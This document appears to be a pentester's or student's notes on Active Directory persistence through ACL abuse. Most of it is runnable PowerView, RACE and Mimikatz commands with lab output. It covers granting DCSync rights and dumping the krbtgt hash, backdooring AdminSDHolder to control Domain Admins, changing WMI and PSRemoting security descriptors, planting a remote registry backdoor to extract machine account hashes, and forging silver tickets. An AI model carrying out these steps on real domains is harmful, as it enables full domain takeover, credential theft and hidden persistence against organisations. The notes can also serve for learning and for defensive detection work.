---
resources:
  - name: sdholder1
    src: "/images/sdholder1.png"
    title: AdminSDHolder
---


# Persistence Using ACLs

## Add Permissions for DCSync

With DA privileges, the ACL for the domain root can be modified to provide useful rights like FullControl or the ability to run "DCSync"

How to check for DCSync privileges:
```powershell
. .\PowerView.ps1
Get-ObjectAcl -DistinguishedName "dc=abc,dc=example,dc=local" -ResolveGUIDs | ? {($_.IdentityReference -match "USERNAME") -and (($_.ObjectType -match 'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))
```


```powershell
#Add FullControl rights:
Add-ObjectAcl -TargetDistinguishedName 'DC=abc,DC=example,DC=local' -PrincipalSamAccountName username -Rights All -Verbose 
#Using ActiveDirectoryModule and Set-ADACL:
Set-ADACL -DistinguishedName 'DC=abc,DC=example,DC=local' -Principal username -Verbose

#Add rights for DCSync:
Add-ObjectAcl -TargetDistinguishedName 'DC=abc,DC=example,DC=local' -PrincipalSamAccountName username -Rights DCSync -Verbose
#Using ActiveDirectoryModule and Set-ADACL:
Set-ADACL -DistinguishedName 'DC=abc,DC=example,DC=local' -Principal username -GUIDRight DCSync -Verbose


#Execute DCSync:
Invoke-Mimikatz -Command '"lsadump::dcsync /user:example\krbtgt"'
```

Example:

```powershell
PS C:\ad\Tools> Add-ObjectAcl -TargetDistinguishedName "dc=abc,dc=example,dc=local" -PrincipalSamAccountName st
udent30 -Rights DCSync -Verbose
VERBOSE: Get-DomainSearcher search string: LDAP://DC=abc,DC=example,DC=local
VERBOSE: Get-DomainSearcher search string: LDAP://DC=abc,DC=example,DC=local
VERBOSE: Granting principal S-1-5-21-1874506631-3219952063-538504511-49108 'DCSync' on
DC=abc,DC=example,DC=local
VERBOSE: Granting principal S-1-5-21-1874506631-3219952063-538504511-49108 '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2'
rights on DC=abc,DC=example,DC=local
VERBOSE: Granting principal S-1-5-21-1874506631-3219952063-538504511-49108 '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2'
rights on DC=abc,DC=example,DC=local
VERBOSE: Granting principal S-1-5-21-1874506631-3219952063-538504511-49108 '89e95b76-444d-4c62-991a-0facbeda640c'
rights on DC=abc,DC=example,DC=local
PS C:\ad\Tools> Get-ObjectAcl -DistinguishedName "dc=abc,dc=example,dc=local" -ResolveGUIDs | ? {($_.IdentityRe
ference -match "username") -and (($_.ObjectType -match 'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'
))}


InheritedObjectType   : All
ObjectDN              : DC=abc,DC=example,DC=local
ObjectType            : DS-Replication-Get-Changes
IdentityReference     : example\username
IsInherited           : False
ActiveDirectoryRights : ExtendedRight
PropagationFlags      : None
ObjectFlags           : ObjectAceTypePresent
InheritanceFlags      : None
InheritanceType       : None
AccessControlType     : Allow
ObjectSID             : S-1-5-21-1874506631-3219952063-538504511
```

This can be used to get the hash of the krbtgt user


```powershell
PS C:\ad\Tools> Invoke-Mimikatz -Command '"lsadump::dcsync /user:example\krbtgt"'

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 20 2021 19:01:18
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(powershell) # lsadump::dcsync /user:example\krbtgt
[DC] 'abc.example.local' will be the domain
[DC] 'dc.abc.example.local' will be the DC server
[DC] 'example\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 2/17/2019 12:01:46 AM
Object Security ID   : S-1-5-21-1874506631-3219952063-538504511-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: ff46a9d8bd66c6efd77603da26796f35
    ntlm- 0: ff46a9d8bd66c6efd77603da26796f35
    lm  - 0: b14d886cf45e2efb5170d4d9c4085aa2

```



## AdminSDHolder


Resides in the System container of a domain and user to control the permissions, using an ACL, for certain built-in privileged groups (called protected groups)

Security Descriptor Propagator (SDPROP) runs ever hour and compares the ACL of protected groups and members with the ACL of AdminSDHolder and any differences are overwritten on the object ACL


List of protected groups:

```
Account Operators
Backup Operators
Server Operators
Print Operators
Domain Admins
Replicator
Enterprise Admins
Domain Controllers
Read-only Domain Controllers
Schema Admins
Administrators
```


Well known abuse of some of the protected groups - All of the below can log on locally to DC
DA, EA = domain and enterprise admins

```
Account Operators - Cannot modify DA/EA/BA groups. Can modify nested group within these groups
Backup Operators - Backup GPO, edit o add SID of controlled account to a privileged group and Restore
Server Operators - Run a command as system (using the disabled Browser service)
Print Operators - Copy ntds.dit backup, load device drivers
```


By adding an account to the ACL of AdminSDHolder object in the system container then using Invoke-SDPropagator.ps1 or waiting for the next run (every 60 minutes) this functionality can be abused to allow a compromised account full permissions over the domain admins group.

This does requre Domain Admin privilges and is a method of persistence.

![](/images/sdholder1.png)


This can be done remotely using the following methods


```powershell
#Add Full Control permissions for a user to the AdminSDHolderusing PowerViewas DA:
Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System '-PrincipalSamAccountName username -Rights All -Verbose


#Using ActiveDirectoryModule and Set-ADACL:
Set-ADACL -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=abc,DC=example,DC=local' -Principal username -Verbose


#Other interesting permissions (ResetPassword, WriteMembers) for a user to the AdminSDHolder,:
Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName username -Rights ResetPassword -Verbose
Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName username -Rights WriteMembers -Verbose


#Run SDPropmanually using Invoke-SDPropagator.ps1 from Tools directory:
Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose
#For pre-Server 2008 machines:
Invoke-SDPropagator -taskname FixUpInheritance -timeoutMinutes 1 -showProgress -Verbose


#Check the Domain Admins permission -PowerView as normal user:
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'username'}
#Using ActiveDirectoryModule:
(Get-Acl -Path 'AD:\CN=Domain Admins,CN=Users,DC=abc,DC=example,DC=local').Access | ?{$_.IdentityReference -match 'username'}


#Abusing FullControlusing PowerView_dev:
Add-DomainGroupMember -Identity 'Domain Admins' -Members testda -Verbose 
#Using ActiveDirectoryModule:
Add-ADGroupMember -Identity 'Domain Admins' -Members testda


Abusing ResetPasswordusing PowerView_dev:
Set-DomainUserPassword -Identity testda -AccountPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose
#Using ActiveDirectoryModule:
Set-ADAccountPassword -Identity testda -NewPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose
```


## Security Descriptors

It is possible to modiy Security Descriptors (security information like Owner, primary group, DACL and SACL of multiple remote access methods (securable objects) to allow access to non-admin users

Administrative privileges are required for this, but is a very useful backdoor mechanism

Security Descriptor Definition Language defines the format which is used to describe a security descriptor. SDDL uses ACE strings for DACL and SACL:ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_si

ACE for built-in administrators for WMI namespaces A;CI;CCDCLCSWRPWPRCWD;;;SID


Two permissions are added with this

```
Component Services > Computers > My computer > right click this
Go to COM Security tab
Edit the "Access Permissions" and add a compromised account
```

![](/images/secdesc1.png)

```
Computer Management > Services and Applications > WMI Control
Right Click WMI Control > Properties
With "Root" selected click on Security button
Add compromised user account here
```

![](/images/secdesc2.png)


This would allow the execution of commands:

```powershell
Invoke-Command -ScriptBlock{whoami} -ComputerName dc
```


#### Example

This was run from a domain administrator powershell session

We need to import RACE.ps1 first, then we can run Set-RemoteWMI
In the verbose output we can see the new ACLs created with the SID of the username used

```powershell
PS C:\ad\Tools> . .\RACE.ps1
PS C:\ad\Tools> Set-RemoteWMI -SamAccountName username -ComputerName dc.abc.example.local -namespace 'ro
ot\cimv2' -Verbose
VERBOSE: Existing ACL for namespace root\cimv2 is
O:BAG:BAD:(A;CIID;CCDCLCSWRPWPRCWD;;;BA)(A;CIID;CCDCRP;;;NS)(A;CIID;CCDCRP;;;LS)(A;CIID;CCDCRP;;;AU)
VERBOSE: Existing ACL for DCOM is
O:BAG:BAD:(A;;CCDCLCSWRP;;;BA)(A;;CCDCSW;;;WD)(A;;CCDCLCSWRP;;;S-1-5-32-562)(A;;CCDCLCSWRP;;;LU)(A;;CCDCSW;;;AC)
VERBOSE: New ACL for namespace root\cimv2 is
O:BAG:BAD:(A;CIID;CCDCLCSWRPWPRCWD;;;BA)(A;CIID;CCDCRP;;;NS)(A;CIID;CCDCRP;;;LS)(A;CIID;CCDCRP;;;AU)(A;CI;CCDCLCSWRPWPR
CWD;;;S-1-5-21-1874506631-3219952063-538504511-49108)
VERBOSE: New ACL for DCOM
O:BAG:BAD:(A;;CCDCLCSWRP;;;BA)(A;;CCDCSW;;;WD)(A;;CCDCLCSWRP;;;S-1-5-32-562)(A;;CCDCLCSWRP;;;LU)(A;;CCDCSW;;;AC)(A;;CCD
CLCSWRP;;;S-1-5-21-1874506631-3219952063-538504511-49108)
````

Then from a normal PS session as the targeted user, I can execute wmi queries on the DC

```powershell
PS C:\ad\tools> gwmi -class win32_operatingsystem -ComputerName dc.abc.example.local


SystemDirectory : C:\Windows\system32
Organization    : 
BuildNumber     : 14393
RegisteredUser  : Windows User
SerialNumber    : 00377-80000-00000-AA805
Version         : 10.0.14393
```


Similar can be done for PSRemoting
From DA PS session

```powershell
PS C:\ad\tools> . .\RACE.ps1
PS C:\ad\tools> Set-RemotePSRemoting -SamAccountName username -ComputerName dc.abc.example.local -Verbose
```


From a PS session as targeted user:

```powershell
PS C:\ad\tools> Invoke-Command -ScriptBlock{whoami} -ComputerName dc.abc.example.local
example\username
```

We can also retieve machine account hashes without DA access by setting this up as DA:


```powershell
PS C:\ad\tools> . .\RACE.ps1
PS C:\ad\tools> Add-RemoteRegBackdoor -ComputerName dc.abc.example.local -Trustee username -Verbose
VERBOSE: [dc.abc.example.local : ] Using trustee username 'username'
VERBOSE: [dc.abc.example.local] Remote registry is not running, attempting to start
VERBOSE: [dc.abc.example.local] Attaching to remote registry through StdRegProv
VERBOSE: [dc.abc.example.local : SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg] Backdooring
started for key
VERBOSE: [dc.abc.example.local : SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg] Creating ACE
 with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)
VERBOSE: [dc.abc.example.local : SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg] Creating the
 trustee WMI object with user 'username'
VERBOSE: [dc.abc.example.local : SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg] Applying
Trustee to new Ace
VERBOSE: [dc.abc.example.local : SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg] Calling
SetSecurityDescriptor on the key with the newly created Ace
VERBOSE: [dc.abc.example.local : SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg] Backdooring
completed for key
VERBOSE: [dc.abc.example.local : SYSTEM\CurrentControlSet\Control\Lsa\JD] Backdooring started for key
VERBOSE: [dc.abc.example.local : SYSTEM\CurrentControlSet\Control\Lsa\JD] Creating ACE with Access Mask
of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)
VERBOSE: [dc.abc.example.local : SYSTEM\CurrentControlSet\Control\Lsa\JD] Creating the trustee WMI
object with user 'username'
VERBOSE: [dc.abc.example.local : SYSTEM\CurrentControlSet\Control\Lsa\JD] Applying Trustee to new Ace
VERBOSE: [dc.abc.example.local : SYSTEM\CurrentControlSet\Control\Lsa\JD] Calling SetSecurityDescriptor
on the key with the newly created Ace
VERBOSE: [dc.abc.example.local : SYSTEM\CurrentControlSet\Control\Lsa\JD] Backdooring completed for key
VERBOSE: [dc.abc.example.local : SYSTEM\CurrentControlSet\Control\Lsa\Skew1] Backdooring started for key
VERBOSE: [dc.abc.example.local : SYSTEM\CurrentControlSet\Control\Lsa\Skew1] Creating ACE with Access
Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)
VERBOSE: [dc.abc.example.local : SYSTEM\CurrentControlSet\Control\Lsa\Skew1] Creating the trustee WMI
object with user 'username'
VERBOSE: [dc.abc.example.local : SYSTEM\CurrentControlSet\Control\Lsa\Skew1] Applying Trustee to new Ace
VERBOSE: [dc.abc.example.local : SYSTEM\CurrentControlSet\Control\Lsa\Skew1] Calling
SetSecurityDescriptor on the key with the newly created Ace
VERBOSE: [dc.abc.example.local : SYSTEM\CurrentControlSet\Control\Lsa\Skew1] Backdooring completed for
key
VERBOSE: [dc.abc.example.local : SYSTEM\CurrentControlSet\Control\Lsa\Data] Backdooring started for key
VERBOSE: [dc.abc.example.local : SYSTEM\CurrentControlSet\Control\Lsa\Data] Creating ACE with Access
Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)
VERBOSE: [dc.abc.example.local : SYSTEM\CurrentControlSet\Control\Lsa\Data] Creating the trustee WMI
object with user 'username'
VERBOSE: [dc.abc.example.local : SYSTEM\CurrentControlSet\Control\Lsa\Data] Applying Trustee to new Ace
VERBOSE: [dc.abc.example.local : SYSTEM\CurrentControlSet\Control\Lsa\Data] Calling
SetSecurityDescriptor on the key with the newly created Ace
VERBOSE: [dc.abc.example.local : SYSTEM\CurrentControlSet\Control\Lsa\Data] Backdooring completed for
key
VERBOSE: [dc.abc.example.local : SYSTEM\CurrentControlSet\Control\Lsa\GBG] Backdooring started for key
VERBOSE: [dc.abc.example.local : SYSTEM\CurrentControlSet\Control\Lsa\GBG] Creating ACE with Access Mask
 of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)
VERBOSE: [dc.abc.example.local : SYSTEM\CurrentControlSet\Control\Lsa\GBG] Creating the trustee WMI
object with user 'username'
VERBOSE: [dc.abc.example.local : SYSTEM\CurrentControlSet\Control\Lsa\GBG] Applying Trustee to new Ace
VERBOSE: [dc.abc.example.local : SYSTEM\CurrentControlSet\Control\Lsa\GBG] Calling SetSecurityDescriptor
 on the key with the newly created Ace
VERBOSE: [dc.abc.example.local : SYSTEM\CurrentControlSet\Control\Lsa\GBG] Backdooring completed for key
VERBOSE: [dc.abc.example.local : SECURITY] Backdooring started for key
VERBOSE: [dc.abc.example.local : SECURITY] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and
AceFlags of 2 (CONTAINER_INHERIT_ACE)
VERBOSE: [dc.abc.example.local : SECURITY] Creating the trustee WMI object with user 'username'
VERBOSE: [dc.abc.example.local : SECURITY] Applying Trustee to new Ace
VERBOSE: [dc.abc.example.local : SECURITY] Calling SetSecurityDescriptor on the key with the newly
created Ace
VERBOSE: [dc.abc.example.local : SECURITY] Backdooring completed for key
VERBOSE: [dc.abc.example.local : SAM\SAM\Domains\Account] Backdooring started for key
VERBOSE: [dc.abc.example.local : SAM\SAM\Domains\Account] Creating ACE with Access Mask of 983103
(ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)
VERBOSE: [dc.abc.example.local : SAM\SAM\Domains\Account] Creating the trustee WMI object with user
'username'
VERBOSE: [dc.abc.example.local : SAM\SAM\Domains\Account] Applying Trustee to new Ace
VERBOSE: [dc.abc.example.local : SAM\SAM\Domains\Account] Calling SetSecurityDescriptor on the key with
the newly created Ace
VERBOSE: [dc.abc.example.local : SAM\SAM\Domains\Account] Backdooring completed for key
VERBOSE: [dc.abc.example.local] Backdooring completed for system

ComputerName                        BackdoorTrustee
------------                        ---------------
dc.abc.example.local username
```

From a PS Session as the targeted user

```powershell
PS C:\ad\tools> . .\RACE.ps1

PS C:\ad\tools> Get-RemoteMachineAccountHash -ComputerName dc.abc.example.local -Verbose
VERBOSE: Bootkey/SysKey : 85462B93FC25EE67BB07AD899096199B
VERBOSE: LSA Key        : FD3251451B1293B9ED7AF4BED8E19A678F514B9BC2B42B796E2C72AF156945E9

ComputerName                        MachineAccountHash              
------------                        ------------------              
dc.abc.example.local 97824439e4448e7b2886cfb66b98d0c7
```

We can then create a silver ticket for the HOST service and execute wmi queries

```powershell
PS C:\ad\tools> . .\Invoke-Mimikatz.ps1

PS C:\ad\tools> Invoke-Mimikatz -Command '"kerberos::golden /domain:abc.example.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dc.abc.example.local /service:HOST /rc4:97824439e4448e7b2886cfb66b98d0c7 /user:Administrator /ptt"'

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 20 2021 19:01:18
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(powershell) # kerberos::golden /domain:abc.example.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dc.abc.example.
local /service:HOST /rc4:97824439e4448e7b2886cfb66b98d0c7 /user:Administrator /ptt
User      : Administrator
Domain    : abc.example.local (abc)
SID       : S-1-5-21-1874506631-3219952063-538504511
User Id   : 500
Groups Id : *513 512 520 518 519 
ServiceKey: 97824439e4448e7b2886cfb66b98d0c7 - rc4_hmac_nt      
Service   : HOST
Target    : dc.abc.example.local
Lifetime  : 5/30/2022 4:00:46 PM ; 5/27/2032 4:00:46 PM ; 5/27/2032 4:00:46 PM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'Administrator @ abc.example.local' successfully submitted for current session


PS C:\ad\tools> Invoke-Mimikatz -Command '"kerberos::golden /domain:abc.example.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dc.abc.example.local /service:RPCSS /rc4:97824439e4448e7b2886cfb66b98d0c7 /user:Administrator /ptt"'

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 20 2021 19:01:18
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(powershell) # kerberos::golden /domain:abc.example.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dc.abc.example.
local /service:RPCSS /rc4:97824439e4448e7b2886cfb66b98d0c7 /user:Administrator /ptt
User      : Administrator
Domain    : abc.example.local (abc)
SID       : S-1-5-21-1874506631-3219952063-538504511
User Id   : 500
Groups Id : *513 512 520 518 519 
ServiceKey: 97824439e4448e7b2886cfb66b98d0c7 - rc4_hmac_nt      
Service   : RPCSS
Target    : dc.abc.example.local
Lifetime  : 5/30/2022 4:02:29 PM ; 5/27/2032 4:02:29 PM ; 5/27/2032 4:02:29 PM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'Administrator @ abc.example.local' successfully submitted for current session


PS C:\ad\tools> gwmi -Class win32_operatingsystem -ComputerName dc.abc.example.local


SystemDirectory : C:\Windows\system32
Organization    : 
BuildNumber     : 14393
RegisteredUser  : Windows User
SerialNumber    : 00377-80000-00000-AA805
Version         : 10.0.14393
```